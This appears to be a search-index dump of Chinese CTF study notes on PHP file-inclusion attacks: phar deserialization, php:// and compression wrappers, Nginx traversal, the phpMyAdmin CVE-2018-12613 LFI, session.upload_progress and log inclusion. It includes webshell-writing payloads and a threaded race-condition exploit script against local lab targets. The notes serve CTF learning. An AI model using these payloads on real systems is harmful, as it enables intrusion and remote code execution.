<p>\uff08\u5176\u5b9e\u662f\u548c\u53cd\u5e8f\u5217\u5316\u6d89\u53ca\u5230\u7684\u6587\u4ef6\u5305\u542b\uff09</p> <p>\u867d\u7136\u6bd4\u8f83\u7279\u4f8b\uff0c\u4f46\u4e5f\u53ef\u4ee5\u4f5c\u4e3a\u4e00\u4e2a\u6a21\u677f\u4e86\uff0c\u5229\u7528\u65b9\u5f0f\u4f1a\u4e0e\u6587\u4ef6\u4e0a\u4f20\u4e00\u8d77\uff0c\u7136\u540e\u5229\u7528phar://\u4f2a\u534f\u8bae\u6765\u8bbf\u95ee\u63a5\u4e0b\u6765\u7684\u5185\u5bb9\u3002</p> <p>\u987a\u5e26\u4e00\u63d0\u5c31\u662f\u5728\u4f7f\u7528phar\u4ee3\u7801\u65f6\uff0c\u8981\u628aphp.ini\u6587\u4ef6\u4e2d\u7684phar.readonly \u8bbe\u7f6e\u4e3aOFF.</p> <p>\u7a0d\u5fae\u5177\u4f53\u70b9\u4ecb\u7ecd\uff1a</p> <pre><code>stub\nphar \u6587\u4ef6\u6807\u8bc6\uff0c\u683c\u5f0f\u4e3a xxx&lt;?php xxx; __HALT_COMPILER();?&gt;\uff1b\nmanifest\n\u538b\u7f29\u6587\u4ef6\u7684\u5c5e\u6027\u7b49\u4fe1\u606f\uff0c\u4ee5/*\u5e8f\u5217\u5316*/\u5b58\u50a8\uff1b\ncontents\n\u538b\u7f29\u6587\u4ef6\u7684\u5185\u5bb9\uff1b\nsignature\n\u7b7e\u540d\uff0c\u653e\u5728\u6587\u4ef6\u672b\u5c3e\uff1b\u8fd9\u91cc\u6709\u4e24\u4e2a\u5173\u952e\u70b9\uff0c\u4e00\u662f\u6587\u4ef6\u6807\u8bc6\uff0c\u5fc5\u987b\u4ee5__HALT_COMPILER();?&gt;\u7ed3\u5c3e\uff0c\u4f46\u524d\u9762\u7684\u5185\u5bb9\u6ca1\u6709\u9650\u5236\uff0c\u4e5f\u5c31\u662f\u8bf4\u6211\u4eec\u53ef\u4ee5\u8f7b\u6613\u4f2a\u9020\u4e00\u4e2a\u56fe\u7247\u6587\u4ef6\u6216\u8005pdf\u6587\u4ef6\u6765\u7ed5\u8fc7\u4e00\u4e9b\u4e0a\u4f20\u9650\u5236\uff1b\u4e8c\u662f\u53cd\u5e8f\u5217\u5316\uff0cphar\u5b58\u50a8\u7684meta-data\u4fe1\u606f\u4ee5\u5e8f\u5217\u5316\u65b9\u5f0f\u5b58\u50a8\uff0c\u5f53\u6587\u4ef6\u64cd\u4f5c\u51fd\u6570\u901a\u8fc7phar://\u4f2a\u534f\u8bae\u89e3\u6790phar\u6587\u4ef6\u65f6\u5c31\u4f1a\u5c06\u6570\u636e\u53cd\u5e8f\u5217\u5316\uff0c\u800c\u8fd9\u6837\u7684\u6587\u4ef6\u64cd\u4f5c\u51fd\u6570\u6709\u5f88\u591a\u3002\nPlain Text\n</code></pre> <p>\u4f8b\u9898\uff1a</p> <p>[CISCN2019 \u534e\u5317\u8d5b\u533a Day1 Web1]Dropbox</p>"},{"location":"web/include/include_normal/#php","title":"php://\u4f2a\u534f\u8bae","text":"<p>php://input,\u7528\u4e8e\u6267\u884cphp\u4ee3\u7801\uff0c\u9700\u8981post\u8bf7\u6c42\u63d0\u4ea4\u6570\u636e\u3002</p>"},{"location":"web/include/include_normal/#phpfilter","title":"php://filter","text":"<p>php://filter\u662f\u4e00\u79cd\u5143\u5c01\u88c5\u5668\uff0c\u7528\u4e8e\u6570\u636e\u6d41\u6253\u5f00\u65f6\u7b5b\u9009\u8fc7\u6ee4\u5e94\u7528\u3002\u8fd9\u5bf9\u4e8e\u4e00\u4f53\u5f0f\uff08all-in-one\uff09\u7684\u6587\u4ef6\u51fd\u6570\u975e\u5e38\u6709\u7528\u3002\u7c7b\u4f3creadfile()\u3001file()\u3001file_get_contents(),\u5728\u6570\u636e\u6d41\u8bfb\u53d6\u4e4b\u524d\u6ca1\u6709\u673a\u4f1a\u4f7f\u7528\u5176\u4ed6\u8fc7\u6ee4\u5668\u3002</p> <p>\u7528\u4e8e\u8bfb\u53d6\u6e90\u7801\uff0cget\u63d0\u4ea4\u53c2\u6570\u3002a=php://filter/read=convert.base64/resource=xxx.php</p> <p>\u9700\u8981\u5f00\u542fallow_url_fopen:php://input\u3001php://stdin\u3001php://memory\u3001php://temp</p> <p>\u4e0d\u9700\u8981\u5f00\u542fallow_url_fopen:php://filter</p> <p>php://filter\u53c2\u6570</p> <p>\u540d\u79f0  \u63cf\u8ff0</p> <p>resource=&lt;\u8981\u8fc7\u6ee4\u7684\u6570\u636e\u6d41&gt;  \u8fd9\u4e2a\u53c2\u6570\u662f\u5fc5\u987b\u7684\u3002\u5b83\u6307\u5b9a\u4e86\u4f60\u8981\u7b5b\u9009\u8fc7\u6ee4\u7684\u6570\u636e\u6d41\u3002</p> <p>read=&lt;\u8bfb\u94fe\u7684\u7b5b\u9009\u5217\u8868&gt;  \u8be5\u53c2\u6570\u53ef\u9009\u3002\u53ef\u4ee5\u8bbe\u5b9a\u4e00\u4e2a\u6216\u591a\u4e2a\u8fc7\u6ee4\u5668\u540d\u79f0\uff0c\u4ee5\u7ba1\u9053\u7b26(</p> <p>write=&lt;\u5199\u94fe\u7684\u7b5b\u9009\u5217\u8868&gt; \u8be5\u53c2\u6570\u53ef\u9009\u3002\u53ef\u4ee5\u8bbe\u5b9a\u4e00\u4e2a\u6216\u591a\u4e2a\u8fc7\u6ee4\u5668\u540d\u79f0\uff0c\u4ee5\u7ba1\u9053\u7b26(</p> <p>&lt;\uff1b\u4e24\u4e2a\u94fe\u7684\u7b5b\u9009\u5217\u8868&gt; \u4efb\u4f55\u6ca1\u6709\u4ee5 read= \u6216 write= \u4f5c\u524d\u7f00 \u7684\u7b5b\u9009\u5668\u5217\u8868\u4f1a\u89c6\u60c5\u51b5\u5e94\u7528\u4e8e\u8bfb\u6216\u5199\u94fe\u3002</p> <p>\u9996\u5148\u8fd9\u662f\u4e00\u4e2afile\u5173\u952e\u5b57\u7684get\u53c2\u6570\u4f20\u9012\uff0cphp://\u662f\u4e00\u79cd\u534f\u8bae\u540d\u79f0\uff0cphp://filter/\u662f\u4e00\u79cd\u8bbf\u95ee\u672c\u5730\u6587\u4ef6\u7684\u534f\u8bae\uff0c/read=convert.base64-encode/\u8868\u793a\u8bfb\u53d6\u7684\u65b9\u5f0f\u662fbase64\u7f16\u7801\u540e\uff0cresource=index.php\u8868\u793a\u76ee\u6807\u6587\u4ef6\u4e3aindex.php\u3002</p> <p>\u901a\u8fc7\u4f20\u9012\u8fd9\u4e2a\u53c2\u6570\u53ef\u4ee5\u5f97\u5230index.php\u7684\u6e90\u7801\uff0c\u4e0b\u9762\u8bf4\u8bf4\u4e3a\u4ec0\u4e48\uff0c\u770b\u5230\u6e90\u7801\u4e2d\u7684include\u51fd\u6570\uff0c\u8fd9\u4e2a\u8868\u793a\u4ece\u5916\u90e8\u5f15\u5165php\u6587\u4ef6\u5e76\u6267\u884c\uff0c\u5982\u679c\u6267\u884c\u4e0d\u6210\u529f\uff0c\u5c31\u8fd4\u56de\u6587\u4ef6\u7684\u6e90\u7801\u3002</p> <p>\u800cinclude\u7684\u5185\u5bb9\u662f\u7531\u7528\u6237\u63a7\u5236\u7684\uff0c\u6240\u4ee5\u901a\u8fc7\u6211\u4eec\u4f20\u9012\u7684file\u53c2\u6570\uff0c\u662finclude\uff08\uff09\u51fd\u6570\u5f15\u5165\u4e86index.php\u7684base64\u7f16\u7801\u683c\u5f0f\uff0c\u56e0\u4e3a\u662fbase64\u7f16\u7801\u683c\u5f0f\uff0c\u6240\u4ee5\u6267\u884c\u4e0d\u6210\u529f\uff0c\u8fd4\u56de\u6e90\u7801\uff0c\u6240\u4ee5\u6211\u4eec\u5f97\u5230\u4e86\u6e90\u7801\u7684base64\u683c\u5f0f\uff0c\u89e3\u7801\u5373\u53ef\u3002</p> <p>\u5982\u679c\u4e0d\u8fdb\u884cbase64\u7f16\u7801\u4f20\u5165\uff0c\u5c31\u4f1a\u76f4\u63a5\u6267\u884c\uff0c\u800cflag\u7684\u4fe1\u606f\u5728\u6ce8\u91ca\u4e2d\uff0c\u662f\u5f97\u4e0d\u5230\u7684\u3002</p>"},{"location":"web/include/include_normal/#_7","title":"\u793a\u4f8b\uff1a","text":"<pre><code>php://filter/read=convert.base64-encode/resource=[\u6587\u4ef6\u540d]\u8bfb\u53d6\u6587\u4ef6\u6e90\u7801\uff08\u9488\u5bf9php\u6587\u4ef6\u9700\u8981base64\u7f16\u7801\uff09http://127.0.0.1/include.php?file=php://filter/read=convert.base64-encode/resource=phpinfo.php\nPlain Text\n</code></pre> <pre><code>php://input + [POST DATA]\u6267\u884cphp\u4ee3\u7801http://127.0.0.1/include.php?file=php://input[POST DATA\u90e8\u5206]&lt;?php phpinfo(); ?&gt;\nPlain Text\n</code></pre> <p>\u82e5\u6709\u5199\u5165\u6743\u9650\uff0c\u5199\u5165\u4e00\u53e5\u8bdd\u6728\u9a6c</p> <pre><code>http://127.0.0.1/include.php?file=php://input[POST DATA\u90e8\u5206]&lt;?php fputs(fopen('1juhua.php','w'),'&lt;?php @eval($_GET[cmd]); ?&gt;'); ?&gt;\nPlain Text\n</code></pre> <p></p> <p>\u603b\u4e4b\u5c31\u4e00\u4e2a\u4ee3\u7801\u6267\u884c\uff0c\u4e00\u4e2a\u5229\u7528\u6570\u636e\u6d41\u8bfb\u53d6\u6e90\u4ee3\u7801</p> <p>#####################################################################</p> <p>\u5173\u4e8efile_put_contents\u7684\u4e00\u4e9b\u5c0f\u6d4b\u8bd5</p> <p>\u6628\u5929\u770b\u4e86\u7bc7\u6587\u7ae0\u4e00\u6b21\u201cSSRF\u2013&gt;RCE\u201d\u7684\u8270\u96be\u5229\u7528\uff0c\u88ab\u91cc\u9762\u7684\u5404\u79cd\u9a9a\u64cd\u4f5c\u7ed9\u79c0\u5230\u4e86\uff0c\u53d1\u73b0file_put_contents\u8fd9\u4e2a\u5f88\u6709\u610f\u601d\uff0c\u7ed5\u8fc7&lt;?php exit();GetShell\u4e5f\u7ecf\u5e38\u6709\u4eba\u63d0\u51fa\u4e0d\u540c\u7684\u601d\u8def\uff0c\u8fd9\u91cc\u7b80\u5355\u7684\u505a\u4e00\u4e0b\u6d4b\u8bd5\u548c\u8bb0\u5f55\u3002 file_put_contents(filename,\u201d&lt;?php exit();\u201d.content);</p> <p>https://cyc1e183.github.io/2020/04/03/%E5%85%B3%E4%BA%8Efile_put_contents%E7%9A%84%E4%B8%80%E4%BA%9B%E5%B0%8F%E6%B5%8B%E8%AF%95/</p>"},{"location":"web/include/include_normal/#zip-bzip2-zlib","title":"zip:// &amp; bzip2:// &amp; zlib:// \u534f\u8bae","text":"<p>\u6761\u4ef6\uff1a</p> <ul> <li> <p><code>allow_url_fopen</code>:off/on</p> </li> <li> <p><code>allow_url_include</code>:off/on</p> </li> <li> <p>\u4f5c\u7528\uff1a<code>zip:// &amp; bzip2:// &amp; zlib://</code>\u5747\u5c5e\u4e8e\u538b\u7f29\u6d41\uff0c\u53ef\u4ee5\u8bbf\u95ee\u538b\u7f29\u6587\u4ef6\u4e2d\u7684\u5b50\u6587\u4ef6\uff0c\u66f4\u91cd\u8981\u7684\u662f\u4e0d\u9700\u8981\u6307\u5b9a\u540e\u7f00\u540d\uff0c\u53ef\u4fee\u6539\u4e3a\u4efb\u610f\u540e\u7f00\uff1a<code>jpg png gif xxx</code>\u7b49\u7b49\u3002</p> </li> <li> <p>\u793a\u4f8b\uff1a</p> </li> </ul> <pre><code>zip://[\u538b\u7f29\u6587\u4ef6\u7edd\u5bf9\u8def\u5f84]%23[\u538b\u7f29\u6587\u4ef6\u5185\u7684\u5b50\u6587\u4ef6\u540d]\uff08#\u7f16\u7801\u4e3a%23\uff09\u538b\u7f29 phpinfo.txt \u4e3a phpinfo.zip \uff0c\u538b\u7f29\u5305\u91cd\u547d\u540d\u4e3a phpinfo.jpg \uff0c\u5e76\u4e0a\u4f20http://127.0.0.1/include.php?file=zip://E:\\phpStudy\\PHPTutorial\\WWW\\phpinfo.jpg%23phpinfo.txt\nPlain Text\n</code></pre> <p></p> <pre><code>compress.bzip2://file.bz2\n\u538b\u7f29 phpinfo.txt \u4e3a phpinfo.bz2 \u5e76\u4e0a\u4f20\uff08\u540c\u6837\u652f\u6301\u4efb\u610f\u540e\u7f00\u540d\uff09\nhttp://127.0.0.1/include.php?file=compress.bzip2://E:\\phpStudy\\PHPTutorial\\WWW\\phpinfo.bz2\nPlain Text\n</code></pre> <p></p> <pre><code>compress.zlib://file.gz\n\u538b\u7f29 phpinfo.txt \u4e3a phpinfo.gz \u5e76\u4e0a\u4f20\uff08\u540c\u6837\u652f\u6301\u4efb\u610f\u540e\u7f00\u540d\uff09\nhttp://127.0.0.1/include.php?file=compress.zlib://E:\\phpStudy\\PHPTutorial\\WWW\\phpinfo.gz\nPlain Text\n</code></pre> <p></p>"},{"location":"web/include/include_pro/","title":"include\u8fdb\u9636","text":""},{"location":"web/include/include_pro/#nginx","title":"Nginx\u76ee\u5f55\u7a7f\u8d8a\u6f0f\u6d1e","text":"<p>Nginx (engine x) \u662f\u4e00\u4e2a\u9ad8\u6027\u80fd\u7684HTTP\u548c\u53cd\u5411\u4ee3\u7406\u670d\u52a1\u5668\uff0c\u4e5f\u662f\u4e00\u4e2aIMAP/POP3/SMTP\u670d\u52a1\u5668\u3002Nginx\u7ecf\u5e38\u88ab\u505a\u4e3a\u53cd\u5411\u4ee3\u7406\uff0c\u52a8\u6001\u7684\u90e8\u5206\u88abproxy_pass\u4f20\u9012\u7ed9\u540e\u7aef\u7aef\u53e3\uff0c\u800c\u9759\u6001\u6587\u4ef6\u9700\u8981Nginx\u6765\u5904\u7406\u3002</p> <p>payload\u5982\u4e0b</p> <pre><code>upload/../../../../../tmp/shell.php\nPlain Text\n</code></pre> <p>\u81f3\u4e8e\u539f\u7406\uff0c\u770b\u770b\u5c31\u80fd\u5f88\u5feb\u7406\u89e3\uff1a</p> <p>NGINX-\u76ee\u5f55\u7a7f\u8d8a\u6f0f\u6d1e_\u662f\u5927\u65b9\u5b50-CSDN\u535a\u5ba2_\u76ee\u5f55\u7a7f\u8d8a\u6f0f\u6d1e</p> <p>\u590d\u73b0\u73af\u5883centos7dockervulhub\uff08git\uff09\u590d\u73b0\u8fc7\u7a0b\u8fdb\u5165/root/vulhub/nginx/insecure-configuration\u76ee\u5f55\u8f93\u5165docker compose up -d \u5f00\u542f\u5bb9\u5668\u8bbf\u95ee\u4e0bfiles\u5728files\u540e\u9762\u52a0\u4e0a..\u53ef\u7a7f\u8d8a\u5230\u4e0a\u7ea7\u76ee\u5f55\u5bfc\u81f4\u6f0f\u6d1e\u7684\u539f\u56e0\uff0curl\u4e0a/files\u6ca1\u6709\u52a0\u540e\u7f00/\uff0c\u800cali...</p> <p>https://blog.csdn.net/nzjdsds/article/details/97624122</p>"},{"location":"web/include/include_pro/#cve-2018-12613","title":"\u6587\u4ef6\u5305\u542b\u6f0f\u6d1eCVE-2018-12613","text":"<p>\u8fd9\u4e2a\u6211\u4e5f\u76f4\u63a5copy\u4e0b\u6765\u4e86\uff0c\u6211\u6ca1\u9047\u89c1\u8fc7\uff0c\u590d\u73b0\u7684\u8bdd\u65f6\u95f4\u4e0d\u592a\u591f\u3002</p> <p>phpMyAdmin 4.8.1 \u8fdc\u7a0b\u6587\u4ef6\u5305\u542b\u6f0f\u6d1e\uff08CVE-2018-12613\uff09_GGyao\u7684\u535a\u5ba2-CSDN\u535a\u5ba2</p> <p>0x01 \u7b80\u4ecbphpMyadmin 4.8.1\u7248\u672c\u7684index.php\u4e2d\u5b58\u5728\u6587\u4ef6\u5305\u542b\u6f0f\u6d1e\uff0c\u901a\u8fc7\u4e8c\u6b21\u7f16\u7801\u53ef\u7ed5\u8fc7\u8fc7\u6ee4\u30020x02 \u6f0f\u6d1e\u590d\u73b01.\u5c06?\u8fdb\u884c\u4e24\u6b21URL\u7f16\u7801\u4e3a&amp;quot;%253f&amp;quot;\uff0c\u6784\u9020\u4e0b\u5217payload\uff1ahttp://xxx:8080/index.php?target=db_sql.php%253f/../../../../../../../../etc/passwd\u6f0f\u6d1e\u5b58\u5728\u30022.\u5728S...</p> <p>https://blog.csdn.net/lhh134/article/details/86539066</p> <p>phpMyadmin 4.8.1\u7248\u672c\u7684index.php\u4e2d\u5b58\u5728\u6587\u4ef6\u5305\u542b\u6f0f\u6d1e\uff0c\u901a\u8fc7\u4e8c\u6b21\u7f16\u7801\u53ef\u7ed5\u8fc7\u8fc7\u6ee4\u3002</p> <p>\u5229\u7528\u8fc7\u7a0b\u5c31\u662f\u5c06\u95ee\u53f7\u7f16\u7801\u6210</p> <pre><code>%253f\nPlain Text\n</code></pre> <p>\u53ef\u4ee5\u7ed5\u8fc7phpmyadmin\u91cc\u9762\u7684\u8fc7\u6ee4\u51fd\u6570</p> <p>\u81f3\u4e8e\u6f0f\u6d1e\u7684\u539f\u7406\uff1a</p> <p>phpmyadmin 4.8.1 \u8fdc\u7a0b\u6587\u4ef6\u5305\u542b\u6f0f\u6d1e\uff08CVE-2018-12613\uff09 - \u6dda\u7b11 - \u535a\u5ba2\u56ed</p> <p>\u6f0f\u6d1e\u8be6\u60c5 \u8303\u56f4 phpMyAdmin 4.8.0\u548c4.8.1 \u539f\u7406 \u9996\u5148\u5728index.php 50 63\u884c\u4ee3\u7801 \u6ee1\u8db35\u4e2a\u6761\u4ef6\u540e\u5c31\u4f1ainclude \u7684\u5185\u5bb9 \u4e0d\u4e3a\u7a7a \u662f\u5b57\u7b26\u4e32 \u4e0d\u4ee5index\u5f00\u5934 \u4e0d\u5728$t</p> <p>https://www.cnblogs.com/leixiao-/p/10265150.html#autoid-0-0-0</p>"},{"location":"web/include/include_pro/#session","title":"session\u6587\u4ef6\u5305\u542b","text":"<p>\u8bb0\u5f97\u4e4b\u524d\u53cd\u5e8f\u5217\u5316\u91cc\u9762session\u53cd\u5e8f\u5217\u5316\u7684\u5185\u5bb9</p> <p>\u8fd9\u91cc\u6240\u7528\u5230\u7684\u4e1c\u897f\u548c\u90a3\u4e2a\u4e00\u6837</p> <p>\u5229\u7528session.upload_progress\u8fdb\u884c\u6587\u4ef6\u5305\u542b\u5229\u7528</p> <p>\u4ee5\u4e0b\u6765\u81ea</p> <p>\u5229\u7528session.upload_progress\u8fdb\u884c\u6587\u4ef6\u5305\u542b\u548c\u53cd\u5e8f\u5217\u5316\u6e17\u900f - FreeBuf\u7f51\u7edc\u5b89\u5168\u884c\u4e1a\u95e8\u6237</p> <p>\u672c\u6587\u4e3b\u8981\u662f\u5229\u7528PHP\u4e2d\u7684session.upload_progress\u529f\u80fd\u4f5c\u4e3a\u8df3\u677f\uff0c\u4ece\u800c\u8fdb\u884c\u6587\u4ef6\u5305\u542b\u548c\u53cd\u5e8f\u5217\u5316\u6f0f\u6d1e\u5229\u7528\u3002</p> <p>https://www.freebuf.com/news/202819.html</p>"},{"location":"web/include/include_pro/#_1","title":"\u6d4b\u8bd5\u73af\u5883","text":"<p>php5.5.38win10\u5173\u4e8esession\u76f8\u5173\u7684\u4e00\u5207\u914d\u7f6e\u90fd\u662f\u9ed8\u8ba4\u503c</p>"},{"location":"web/include/include_pro/#_2","title":"\u793a\u4f8b\u4ee3\u7801","text":"<pre><code>&lt;?php$b=$_GET['file'];include \"$b\";?&gt;\nPlain Text\n</code></pre> <p>\u53ef\u4ee5\u53d1\u73b0\uff0c\u5b58\u5728\u4e00\u4e2a\u6587\u4ef6\u5305\u542b\u6f0f\u6d1e\uff0c\u4f46\u662f\u627e\u4e0d\u5230\u4e00\u4e2a\u53ef\u4ee5\u5305\u542b\u7684\u6076\u610f\u6587\u4ef6\u3002\u5176\u5b9e\uff0c\u6211\u4eec\u53ef\u4ee5\u5229\u7528<code>session.upload_progress</code>\u5c06\u6076\u610f\u8bed\u53e5\u5199\u5165session\u6587\u4ef6\uff0c\u4ece\u800c\u5305\u542bsession\u6587\u4ef6\u3002\u524d\u63d0\u9700\u8981\u77e5\u9053session\u6587\u4ef6\u7684\u5b58\u653e\u4f4d\u7f6e\u3002</p>"},{"location":"web/include/include_pro/#_3","title":"\u5206\u6790","text":"<p>\u95ee\u9898\u4e00</p> <p>\u4ee3\u7801\u91cc\u6ca1\u6709<code>session_start()</code>,\u5982\u4f55\u521b\u5efasession\u6587\u4ef6\u5462\u3002</p> <p>\u89e3\u7b54\u4e00</p> <p>\u5176\u5b9e\uff0c\u5982\u679c<code>session.auto_start=On</code>\uff0c\u5219PHP\u5728\u63a5\u6536\u8bf7\u6c42\u7684\u65f6\u5019\u4f1a\u81ea\u52a8\u521d\u59cb\u5316Session\uff0c\u4e0d\u518d\u9700\u8981\u6267\u884csession_start()\u3002\u4f46\u9ed8\u8ba4\u60c5\u51b5\u4e0b\uff0c\u8fd9\u4e2a\u9009\u9879\u90fd\u662f\u5173\u95ed\u7684\u3002</p> <p>\u4f46session\u8fd8\u6709\u4e00\u4e2a\u9ed8\u8ba4\u9009\u9879\uff0csession.use_strict_mode\u9ed8\u8ba4\u503c\u4e3a0\u3002\u6b64\u65f6\u7528\u6237\u662f\u53ef\u4ee5\u81ea\u5df1\u5b9a\u4e49Session ID\u7684\u3002\u6bd4\u5982\uff0c\u6211\u4eec\u5728Cookie\u91cc\u8bbe\u7f6ePHPSESSID=TGAO\uff0cPHP\u5c06\u4f1a\u5728\u670d\u52a1\u5668\u4e0a\u521b\u5efa\u4e00\u4e2a\u6587\u4ef6\uff1a/tmp/sess_TGAO\u201d\u3002\u5373\u4f7f\u6b64\u65f6\u7528\u6237\u6ca1\u6709\u521d\u59cb\u5316Session\uff0cPHP\u4e5f\u4f1a\u81ea\u52a8\u521d\u59cb\u5316Session\u3002 \u5e76\u4ea7\u751f\u4e00\u4e2a\u952e\u503c\uff0c\u8fd9\u4e2a\u952e\u503c\u6709ini.get(\"session.upload_progress.prefix\")+\u7531\u6211\u4eec\u6784\u9020\u7684session.upload_progress.name\u503c\u7ec4\u6210\uff0c\u6700\u540e\u88ab\u5199\u5165sess_\u6587\u4ef6\u91cc\u3002</p> <p>\u95ee\u9898\u4e8c</p> <p>\u4f46\u662f\u95ee\u9898\u6765\u4e86\uff0c\u9ed8\u8ba4\u914d\u7f6e<code>session.upload_progress.cleanup = on</code>\u5bfc\u81f4\u6587\u4ef6\u4e0a\u4f20\u540e\uff0csession\u6587\u4ef6\u5185\u5bb9\u7acb\u5373\u6e05\u7a7a\uff0c</p> <p>\u5982\u4f55\u8fdb\u884crce\u5462\uff1f</p> <p>\u89e3\u7b54\u4e8c</p> <p>\u6b64\u65f6\u6211\u4eec\u53ef\u4ee5\u5229\u7528\u7ade\u4e89\uff0c\u5728session\u6587\u4ef6\u5185\u5bb9\u6e05\u7a7a\u524d\u8fdb\u884c\u5305\u542b\u5229\u7528\u3002</p>"},{"location":"web/include/include_pro/#_4","title":"\u5229\u7528\u811a\u672c","text":"<pre><code>#coding=utf-8\u200bimport ioimport requestsimport threadingsessid = 'TGAO'data = {\"cmd\":\"system('whoami');\"}def write(session):    while True:        f = io.BytesIO(b'a' * 1024 * 50)        resp = session.post( 'http://127.0.0.1:5555/test56.php', data={'PHP_SESSION_UPLOAD_PROGRESS': '&lt;?php eval($_POST[\"cmd\"]);?&gt;'}, files={'file': ('tgao.txt',f)}, cookies={'PHPSESSID': sessid} )def read(session):    while True:        resp = session.post('http://127.0.0.1:5555/test56.php?file=session/sess_'+sessid,data=data)        if 'tgao.txt' in resp.text:            print(resp.text)            event.clear()        else:            print(\"[+++++++++++++]retry\")if __name__==\"__main__\":    event=threading.Event()    with requests.session() as session:        for i in xrange(1,30):             threading.Thread(target=write,args=(session,)).start()\u200b        for i in xrange(1,30):            threading.Thread(target=read,args=(session,)).start()    event.set()\nPlain Text\n</code></pre> <p>\u6548\u679c\u5982\u4e0b\u56fe</p> <p></p>"},{"location":"web/include/include_pro/#_5","title":"\u65e5\u5fd7\u5305\u542b","text":"<p>\u5728\u6211\u7684\u5370\u8c61\u4e2d\u662f\u6709\u8fd9\u6837\u7684\u64cd\u4f5c\u7684\uff0c\u800c\u4e14\u53ef\u4ee5\u901a\u8fc7\u4fee\u6539\u65e5\u5fd7\u6587\u4ef6\u8fbe\u5230\u8fdc\u7a0b\u4ee3\u7801\u6267\u884c\u7684\u4f5c\u7528\u3002</p>"},{"location":"web/include/include_pro/#apache2","title":"apache2","text":"<p>\u4ee5ubuntu\u4e0bapache2\u4e3a\u4f8b\uff0c\u5148\u8bf7\u6c42<code>/&lt;?php phpinfo();?&gt;</code>\uff0c\u7136\u540e\u5305\u542b/var/log/apache2/access.log\u5373\u53ef</p>"},{"location":"web/include/include_pro/#mail","title":"mail","text":"<p>/var/log/mail.log</p> <p>\u81f3\u4e8e\u53c2\u8003</p> <p>\u5b89\u6052\u676f6\u6708\u8d5bweb2 easypentest | JrXnm' blog</p> <p>https://blog.szfszf.top/tech/%E5%AE%89%E6%81%92%E6%9D%AF6%E6%9C%88%E8%B5%9B-easypentest/</p> <p>\u5df2\u7ecf\u6e17\u900f\u8fdb\u5185\u7f51</p>"},{"location":"web/linux/LD_PRELOAD%E5%87%BD%E6%95%B0%E5%8A%AB%E6%8C%81/","title":"LD_PRELOAD\u51fd\u6570\u52ab\u6301","text":"<p>\u8fd9\u4e2a\u6f0f\u6d1e\u6211\u95ee\u8fc7\u5353\u817e\u9f99\u5b66\u957f</p> <p>\u5982\u679c\u6709\u4e0d\u4f1a\u7684\uff0c\u770b\u4e0d\u61c2\u7684\u53ef\u4ee5\u53bb\u95ee\u4ed6</p> <p>\u8fd9\u91cc\u7684\u5185\u5bb9\u4f1a\u7275\u626f\u5230\u4e00\u4e9blinux\u5185\u6838\uff0c\u5904\u7406\u673a\u5236\u76f8\u5173\u7684\u77e5\u8bc6</p> <p>\u5c31\u7b97\u5b9e\u5728\u4e0d\u4f1a\u5229\u7528\u7684\uff0c\u6211\u4e5f\u7ed9\u51fa\u4e86\u4e00\u79cd\u76f8\u5bf9\u7b80\u5355\u7684\u65b9\u6cd5</p> <p>\u4e0b\u9762\u662f\u9884\u5907\u77e5\u8bc6</p>"},{"location":"web/linux/LD_PRELOAD%E5%87%BD%E6%95%B0%E5%8A%AB%E6%8C%81/#_1","title":"LD_PRELOAD\u51fd\u6570\u52ab\u6301","text":"<p>LD_PRELOAD\u4f7f\u7528\u9650\u5236</p> <p>\u8fd9\u79cd\u65b9\u5f0f\u867d\u7136\u5f88\u9177\uff0c\u4f46\u5374\u6709\u4e00\u4e9b\u9650\u5236\u3002\u6bd4\u5982\u5bf9\u4e8e\u9759\u6001\u7f16\u8bd1\u7684\u7a0b\u5e8f\u662f\u65e0\u6548\u7684\u3002\u56e0\u4e3a\u9759\u6001\u7f16\u8bd1\u7684\u7a0b\u5e8f\u4e0d\u9700\u8981\u8fde\u63a5\u52a8\u6001\u5e93\u7684\u9762\u7684\u51fd\u6570\u3002\u800c\u4e14\uff0c\u5047\u5982\u6587\u4ef6\u7684SUID\u6216SGID\u4f4d\u88ab\u7f6e1\uff0c\u52a0\u8f7d\u7684\u65f6\u5019\u4f1a\u5ffd\u7565LD_PRELOAD(\u8fd9\u662fld\u7684\u5f00\u53d1\u8005\u51fa\u4e8e\u5b89\u5168\u8003\u8651\u505a\u7684)\u3002</p>"},{"location":"web/linux/LD_PRELOAD%E5%87%BD%E6%95%B0%E5%8A%AB%E6%8C%81/#_2","title":"LD_PRELOAD\u51fd\u6570\u52ab\u6301","text":""},{"location":"web/linux/LD_PRELOAD%E5%87%BD%E6%95%B0%E5%8A%AB%E6%8C%81/#linux","title":"\u9996\u5148\u7ed9\u51falinux\u7a0b\u5e8f\u7684\u4e09\u79cd\u94fe\u63a5","text":"<pre><code>\u9759\u6001\u94fe\u63a5\uff1a\u5728\u7a0b\u5e8f\u8fd0\u884c\u4e4b\u524d\u5148\u5c06\u5404\u4e2a\u76ee\u6807\u6a21\u5757\u4ee5\u53ca\u6240\u9700\u8981\u7684\u5e93\u51fd\u6570\u94fe\u63a5\u6210\u4e00\u4e2a\u5b8c\u6574\u7684\u53ef\u6267\u884c\u7a0b\u5e8f\uff0c\u4e4b\u540e\u4e0d\u518d\u62c6\u5f00\u3002\n\u88c5\u5165\u65f6\u52a8\u6001\u94fe\u63a5\uff1a\u6e90\u7a0b\u5e8f\u7f16\u8bd1\u540e\u6240\u5f97\u5230\u7684\u4e00\u7ec4\u76ee\u6807\u6a21\u5757\uff0c\u5728\u88c5\u5165\u5185\u5b58\u65f6\uff0c\u8fb9\u88c5\u5165\u8fb9\u94fe\u63a5\u3002\n\u8fd0\u884c\u65f6\u52a8\u6001\u94fe\u63a5\uff1a\u539f\u7a0b\u5e8f\u7f16\u8bd1\u540e\u5f97\u5230\u7684\u76ee\u6807\u6a21\u5757\uff0c\u5728\u7a0b\u5e8f\u6267\u884c\u8fc7\u7a0b\u4e2d\u9700\u8981\u7528\u5230\u65f6\u624d\u5bf9\u5b83\u8fdb\u884c\u94fe\u63a5\nPlain Text\n</code></pre> 